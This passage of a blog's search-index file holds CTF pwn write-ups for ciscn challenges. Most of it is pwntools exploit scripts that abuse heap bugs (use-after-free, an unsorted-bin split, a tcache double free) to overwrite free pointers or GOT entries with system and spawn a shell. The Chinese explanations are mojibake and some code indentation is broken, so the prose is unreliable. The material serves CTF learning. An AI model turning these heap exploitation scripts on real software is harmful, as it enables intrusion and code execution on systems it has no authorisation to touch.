class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\x11\n'</span>,<span class="number">0x80</span>,<span class="string">'\x12\n'</span>)<span class="comment">#idx 0 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x13\n'</span>,<span class="number">0x10</span>,<span class="string">"\x14\n"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x15\x15'</span>,<span class="number">0x10</span>,<span class="string">'\x16\x16'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>,<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x17\n'</span>,<span class="number">0x160</span>,<span class="number">0x128</span> * <span class="string">'a'</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">log.success(<span class="string">"libc: "</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system_addr:"</span> + hex(system_addr))</span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr),<span class="number">0x4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h3><p>è€ƒç‚¹åœ¨sropã€‚</p><p>é¦–å…ˆäº†è§£ä¸€ä¸‹ï¼Œåœ¨rax=15æ—¶ä¼šè§¦å‘ SigreturnFrame ï¼Œåˆå¯ä»¥é€šè¿‡è§‚å¯Ÿæ±‡ç¼–ï¼Œçœ‹åˆ°ä¸¤æ¬¡çš„æ ˆç©ºé—´éƒ½æ˜¯0x10ã€‚</p><h3 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h3><p>åŸæœ¬æ˜¯ubuntu16.04ç¯å¢ƒçš„ï¼Œä½†æ˜¯è¿œç¨‹æ˜¯18ï¼Œä¹Ÿä¸æ˜¯ä¸å¯ä»¥æ‰“ã€‚å°±å€Ÿæ­¤æŠŠä¸¤ä¸ªç¯å¢ƒçš„æ‰“æ³•éƒ½è¯´ä¸€ä¸‹å§ã€‚</p><p>ubuntu16.04</p><p>æ‰“æ³•1</p><p>uafæ¼æ´ï¼Œä¸”é¢˜ç›®ä¸­recordsç»“æ„ä½“ä¼šå…ˆè¡Œmalloc(0xc)ï¼Œä¸”æ”¾å…¥å¯¹åº”çš„æŒ‡é’ˆã€‚</p><p>è‹¥æ˜¯strç±»å‹ï¼Œé‚£ä¹ˆå°±æ˜¯str_printf,str_freeå’Œä¸€ä¸ªæŒ‡å‘chunkçš„æŒ‡é’ˆ</p><p>è‹¥æ˜¯intç±»å‹ï¼Œé‚£ä¹ˆå°±æ˜¯int_printf,int_freeå’Œç›´æ¥å†™å…¥çš„æ•°å€¼</p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ä¿®æ”¹recordsä¸­çš„freeæŒ‡é’ˆï¼Œæ”¹ä¸ºsystemï¼Œç„¶ååœ¨å¯¹åº”çš„chunkå†…å†™å…¥binshï¼Œå°†å…¶freeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'x86'</span></span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_n_3"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./x86_libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addstr</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Type &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Length &gt; "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">""</span>:</span><br><span class="line">    sh.recvuntil(<span class="string">"Value &gt; "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addInt</span><span class="params">(idx,num)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Type &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Value &gt; "</span>)</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(str(<span class="number">2</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(str(<span class="number">3</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line">addstr(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">addstr(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">addInt(<span class="number">2</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#fasted bin FILOç‰¹æ€§ï¼Œæ•…bin 0x10 å­˜åœ¨ä¸¤ä¸ªã€‚Intçš„0x10å…ˆè¢«mallocå‡ºå»</span></span><br><span class="line">addstr(<span class="number">3</span>,<span class="number">0xc</span>,<span class="string">'bash'</span>+p32(elf.plt[<span class="string">'system'</span>]))<span class="comment">#æ­¤æ—¶çš„records malloc(0xc)å°±å†™åˆ°äº†Intçš„åœ°å€ã€‚æœ¬èº«çš„chunkå†™åˆ°äº†åŸæœ¬strçš„0x10å¤„</span></span><br><span class="line">addstr(<span class="number">4</span>,<span class="number">0x28</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">z()</span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#ä½†æ˜¯æ­¤å¤„å­˜ç–‘ï¼Œå› ä¸ºæŸblogè¯´åŸæœ¬æŒ‡å‘string chunkçš„æŒ‡é’ˆå› ä¸º\x0açš„è¦†ç›–ï¼ŒæŒ‡å‘äº†bash</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>æ‰“æ³•2</p><p>åˆ©ç”¨unsorted binåœ¨mallocæ—¶ï¼Œå¦‚æœå‰©ä½™çš„binå¤§å°ä¸è¶³ä»¥å®¹çº³fd + bkï¼Œé‚£ä¹ˆå°±ä¼šå…¨éƒ¨è¢«mallocå‡ºå»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ciscn_2019_n_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'x86'</span></span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_n_3"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./x86_libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addstr</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Type &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Length &gt; "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">""</span>:</span><br><span class="line">sh.recvuntil(<span class="string">"Value &gt; "</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addInt</span><span class="params">(idx,num)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Type &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Value &gt; "</span>)</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(str(<span class="number">2</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(str(<span class="number">3</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line">addstr(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">"a"</span>*<span class="number">0x7E</span> + <span class="string">"\n"</span>)</span><br><span class="line">addInt(<span class="number">1</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">addstr(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x3E</span>+<span class="string">'\n'</span>)</span><br><span class="line">addInt(<span class="number">4</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = <span class="string">"sh\x00\x00"</span> + p32(elf.plt[<span class="string">'system'</span>]) + p32(<span class="number">0xdeadbeef</span>) + <span class="string">'\n'</span></span><br><span class="line">addstr(<span class="number">5</span>,<span class="number">0x14</span>,payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ubuntu18</p><p>tcache binçš„double free</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ciscn_2019_n_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'x86'</span></span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_n_3"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./x86_libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">main_arena_offset = <span class="number">0xf7763780</span> - <span class="number">0xf75b1000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addstr</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Type &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Length &gt; "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">""</span>:</span><br><span class="line">    sh.recvuntil(<span class="string">"Value &gt; "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addInt</span><span class="params">(idx,num)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Type &gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Value &gt; "</span>)</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(str(<span class="number">2</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"CNote &gt; "</span>)</span><br><span class="line">    sh.sendline(str(<span class="number">3</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Index &gt; "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line">addstr(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">addstr(<span class="number">1</span>,<span class="number">0xc</span>,<span class="string">'a'</span>)</span><br><span class="line">addInt(<span class="number">2</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">addstr(<span class="number">3</span>,<span class="number">0x38</span>,p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line">addstr(<span class="number">4</span>,<span class="number">0x38</span>,p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line">addstr(<span class="number">5</span>,<span class="number">0x38</span>,p32(elf.plt[<span class="string">'system'</span>])+p32(<span class="number">0x080484b6</span>))<span class="comment">#å› ä¸ºtcache binæ˜¯ä¸€ä¸ªFIFOï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™æ¬¡mallocçš„æ—¶å€™ï¼Œrecordsçš„malloc(0xc)ä¼šè·‘åˆ°delete(1)çš„é‚£ä¸ªåœ°æ–¹ï¼Œä¸ä¼šå½±å“æˆ‘ä»¬æ”¹å†™gotè¡¨ã€‚</span></span><br><span class="line"><span class="comment">#0x080484b6ä¸ºfgetsçš„é‡å®šå‘åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šå†™å…¥\x0aï¼Œç ´ååé¢çš„fgetsçš„gotè¡¨ï¼Œæ‰€ä»¥è¦é‡å®šå‘ã€‚</span></span><br><span class="line">addstr(<span class="number">6</span>,<span class="number">0x48</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
